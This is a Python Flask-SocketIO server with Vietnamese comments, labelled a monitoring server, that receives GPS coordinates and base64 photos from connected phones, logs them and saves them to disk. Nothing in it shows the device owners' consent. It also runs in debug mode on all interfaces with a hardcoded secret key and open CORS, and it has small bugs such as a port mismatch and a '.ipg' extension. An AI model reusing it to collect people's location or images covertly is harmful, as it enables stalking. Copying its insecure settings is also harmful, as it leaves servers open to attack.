from flask import Flask, request
from flask_socketio import SocketIO, emit
import os
import base64
from datetime import datetime

# ----- CAU HINH SEVER -----    
app = Flask(__name__)
app.config['SECRET_KEY'] = 'nhung_anh_chang_sieu_dep_trai'
# tao ket noi tu gia lap den dien thoai
socketio = SocketIO(app, cors_allowed_origins="*")

# Tao thu muc de lu anh 
UPLOAD_FOLDER = 'storage/images'
if not os.path.exists(UPLOAD_FOLDER):
    os.makedirs(UPLOAD_FOLDER)
# cấu hình databse mongodb



# Giao diện web
@app.route('/')
def index():
    return "<h1>Server Giám sát đang chạy! (Đang chờ dữ liệu đây...)</h1>"

# Xử lý kết nối
@socketio.on('connect')
def handle_connect():
    print(f"\n[+] THIẾT BỊ MỚI KẾT NỐI: {request.sid}")
    emit('server_log',{'msg':'Hi fen, server đã nhận kết nối rồi nhé ~~'})

@socketio.on('disconnect')
def handle_disconnect():
    print(f"[-] THIẾT BỊ ĐÃ NGẮT KẾT NỐI: {request.sid}")

# ------ Xử lý dữ liệu -------
@socketio.on('gui_toa_do')
def nhan_gps(data):
    print(f"[gps] nhận từ {data.get('device.id')}: {data.get('lat')}, {data.get('long')}")
    # DATABASE MONGODB

# Nhận ảnh chụp
@socketio.on('gui_anh')
def nhan_anh(data):

    device_id = data.get('device.id')
    base4_str = data.get('img')

    print(f"[IMAGE] đang nhận ảnh từ {device_id}...")

    try:
        img_data = base64.b64decode(base4_str)
        filename = f"img_{datetime.now().strftime('%Y%m%d_%H%M%S')}.ipg"
        filepath = os.path.join(UPLOAD_FOLDER, filename)
        with open(filepath, 'wb') as f:
            f.write(img_data)
            print(f" -> Đã lưu file ảnh tại: {filepath}")
    except Exception as e:
        print(f" -> Lỗi lưu file ảnh: {e}")

# ---- CHẠY SERVER -----
if __name__ == '__main__':
    print(">>>>> SERVER STARTING ON PORT 50000 <<<<<")
    socketio.run(app, host='0.0.0.0', port=5000, debug = True)